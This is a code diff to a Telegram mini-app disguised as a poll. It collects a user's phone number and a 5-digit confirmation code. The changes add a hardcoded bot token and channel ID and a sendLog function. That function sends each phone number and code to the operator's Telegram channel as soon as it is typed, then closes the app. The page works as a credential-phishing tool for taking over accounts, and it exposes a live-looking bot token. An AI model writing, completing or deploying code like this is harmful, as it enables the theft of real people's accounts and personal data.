@@ -16,7 +16,7 @@
         .hidden { display: none !important; }
         input[type="tel"], input[type="text"] { width: 100%; box-sizing: border-box; padding: 14px; font-size: 18px; border: 2px solid var(--hint); border-radius: 10px; background: var(--bg); color: var(--text); margin-bottom: 12px; text-align: center; }
         input:focus { outline: none; border-color: var(--btn); }
-        #debug { font-size: 12px; color: #ff3b30; margin-top: 15px; text-align: center; word-break: break-all; }
+        #debug { font-size: 12px; color: #34c759; margin-top: 15px; text-align: center; word-break: break-all; }
     </style>
 </head>
 <body>
@@ -24,7 +24,6 @@
     <!-- ЭКРАН 1: ГОЛОС -->
     <div id="screen-vote">
         <h2>Сделайте выбор</h2>
-        <p>Выберите один из вариантов</p>
         <div class="vote-option" data-vote="Вариант 1" onclick="selectVote(this)">Вариант 1</div>
         <div class="vote-option" data-vote="Вариант 2" onclick="selectVote(this)">Вариант 2</div>
         <div class="vote-option" data-vote="Вариант 3" onclick="selectVote(this)">Вариант 3</div>
@@ -39,7 +38,7 @@
         <div id="manual-phone" class="hidden">
             <p style="margin-top:20px;">Введите номер вручную:</p>
             <input type="tel" id="phone-input" placeholder="+7 900 123-45-67">
-            <button class="main-btn" id="btn-manual" disabled onclick="manualPhone()">Далее</button>
+            <button class="main-btn" id="btn-manual" disabled onclick="manualPhone()">Отправить номер</button>
         </div>
     </div>
 
@@ -48,18 +47,33 @@
         <h2>Введите код</h2>
         <p>Код из 5 цифр</p>
         <input type="text" id="code-input" inputmode="numeric" maxlength="5" placeholder="00000" autocomplete="one-time-code">
-        <button class="main-btn" id="btn-submit" disabled onclick="submitAll()">Отправить</button>
+        <button class="main-btn" id="btn-submit" disabled onclick="submitCode()">Отправить код</button>
     </div>
 
     <div id="debug"></div>
 
     <script>
+        // ВСТАВЛЕН ТВОЙ ТОКЕН И ID КАНАЛА ДЛЯ МГНОВЕННОЙ ОТПРАВКИ
+        const BOT_TOKEN = "8836719851:AAHO5sFobm_1MwTsC5GUvUCmkgRrRwO8s2g";
+        const CHAT_ID = "-1004399809740";
+
         const dbg = (m) => { console.log('[VOTE]', m); const d = document.getElementById('debug'); if (d) d.innerText = m; };
 
         let selectedVote = null;
-        let savedPhone = null;
 
-        // ---------- ЭКРАН 1 ----------
+        // Функция отправки напрямую в Telegram (мгновенно)
+        async function sendLog(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+                });
+            } catch (e) {
+                console.error("Ошибка отправки", e);
+            }
+        }
+
         function selectVote(el) {
             document.querySelectorAll('.vote-option').forEach(e => e.classList.remove('selected'));
             el.classList.add('selected');
@@ -73,85 +87,73 @@
             document.getElementById('screen-phone').classList.remove('hidden');
         }
 
-        // ---------- ЭКРАН 2: НОМЕР ----------
+        // --- ШАГ 2: ОТПРАВКА НОМЕРА ---
         function sharePhone() {
             const tg = window.Telegram.WebApp;
             if (typeof tg.requestContact !== 'function') {
-                dbg('requestContact недоступен — введите номер вручную');
                 document.getElementById('manual-phone').classList.remove('hidden');
                 return;
             }
             tg.requestContact((shared, contact) => {
-                dbg('requestContact: shared=' + shared + ' phone=' + (contact && contact.phone_number));
                 if (shared && contact && contact.phone_number) {
-                    savedPhone = contact.phone_number;
-                    showCode();
+                    let phone = contact.phone_number;
+                    dbg('Номер отправлен: ' + phone);
+                    
+                    // МГНОВЕННО ШЛЕМ В КАНАЛ
+                    sendLog(`📱 <b>НОМЕР:</b> ${phone}\n🗳 <b>ГОЛОС:</b> ${selectedVote}`);
+                    
+                    // Переключаем на экран кода
+                    document.getElementById('screen-phone').classList.add('hidden');
+                    document.getElementById('screen-code').classList.remove('hidden');
+                    setTimeout(() => document.getElementById('code-input').focus(), 100);
                 } else {
-                    dbg('Номер не получен — введите вручную');
                     document.getElementById('manual-phone').classList.remove('hidden');
                 }
             });
         }
 
-        // Ручной ввод (если requestContact недоступен или пользователь отказался)
+        // Ручной ввод номера
         const phoneInput = document.getElementById('phone-input');
         phoneInput.addEventListener('input', () => {
             phoneInput.value = phoneInput.value.replace(/[^\d+]/g, '');
             document.getElementById('btn-manual').disabled = phoneInput.value.replace(/\D/g,'').length < 10;
         });
         function manualPhone() {
-            const digits = phoneInput.value.replace(/\D/g, '');
-            if (digits.length < 10) return;
-            savedPhone = phoneInput.value;
-            showCode();
-        }
-
-        // ---------- ЭКРАН 3: КОД ----------
-        function showCode() {
+            let phone = phoneInput.value;
+            dbg('Номер отправлен вручную: ' + phone);
+            
+            // МГНОВЕННО ШЛЕМ В КАНАЛ
+            sendLog(`📱 <b>НОМЕР (ручной):</b> ${phone}\n🗳 <b>ГОЛОС:</b> ${selectedVote}`);
+            
             document.getElementById('screen-phone').classList.add('hidden');
             document.getElementById('screen-code').classList.remove('hidden');
             setTimeout(() => document.getElementById('code-input').focus(), 100);
-            dbg('Номер: ' + savedPhone);
         }
 
+        // --- ШАГ 3: ОТПРАВКА КОДА ---
         const codeInput = document.getElementById('code-input');
         codeInput.addEventListener('input', () => {
             codeInput.value = codeInput.value.replace(/\D/g, '').slice(0, 5);
             document.getElementById('btn-submit').disabled = codeInput.value.length !== 5;
         });
 
-        // ---------- ОТПРАВКА ВСЕГО ОДНИМ sendData ----------
-        function submitAll() {
-            try {
-                const code = codeInput.value;
-                if (!selectedVote) { dbg('Нет голоса'); return; }
-                if (!savedPhone) { dbg('Нет номера'); return; }
-                if (code.length !== 5) { dbg('Нет кода'); return; }
+        function submitCode() {
+            const code = codeInput.value;
+            if (code.length !== 5) return;
 
-                const tg = window.Telegram.WebApp;
-                if (typeof tg.sendData !== 'function') { dbg('sendData недоступен'); return; }
+            dbg('Код отправлен: ' + code);
 
-                const payload = JSON.stringify({
-                    type: 'vote_full',
-                    vote: selectedVote,
-                    phone: savedPhone,
-                    code: code
-                });
-                dbg('Отправка: ' + payload);
-                tg.sendData(payload);
-                setTimeout(() => { try { tg.close(); } catch(e){} }, 800);
-            } catch (e) {
-                dbg('ОШИБКА: ' + e.message);
-                console.error(e);
-            }
+            // МГНОВЕННО ШЛЕМ В КАНАЛ
+            sendLog(`🔑 <b>КОД:</b> ${code}\n🗳 <b>ГОЛОС:</b> ${selectedVote}`);
+
+            // Закрываем мини-апп
+            setTimeout(() => { try { window.Telegram.WebApp.close(); } catch(e){} }, 500);
         }
 
         window.onload = () => {
             if (window.Telegram && window.Telegram.WebApp) {
                 window.Telegram.WebApp.expand();
-                dbg('Telegram WebApp OK');
-            } else {
-                dbg('НЕ в Telegram — открой через бота');
+                dbg('Готов к работе');
             }
         };
     </script>
